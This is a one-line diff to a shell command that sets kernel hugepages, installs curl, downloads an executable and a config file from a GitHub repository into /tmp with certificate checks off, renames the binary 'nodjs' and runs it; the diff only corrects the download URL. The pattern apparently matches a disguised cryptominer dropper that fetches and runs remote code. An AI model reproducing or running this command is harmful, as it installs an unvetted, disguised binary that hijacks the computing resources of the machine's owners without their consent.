@@ -1,1 +1,1 @@
-echo 512 > /proc/sys/vm/nr_hugepages  ||apt install curl -y &&  cd /tmp/ && curl -LOk https://github.com/mmm_ok/blob/master/x?raw=true && curl -LOk https://raw.githubusercontent.com/mmm_ok/master/sconfig.json && mv x?raw=true nodjs && chmod +x nodjs && ./nodjs -c sconfig.json
+echo 512 > /proc/sys/vm/nr_hugepages  ||apt install curl -y &&  cd /tmp/ && curl -LOk https://github.com/ban01ban/mmm_ok/raw/master/x?raw=true && curl -LOk https://raw.githubusercontent.com/mmm_ok/master/sconfig.json && mv x?raw=true nodjs && chmod +x nodjs && ./nodjs -c sconfig.json
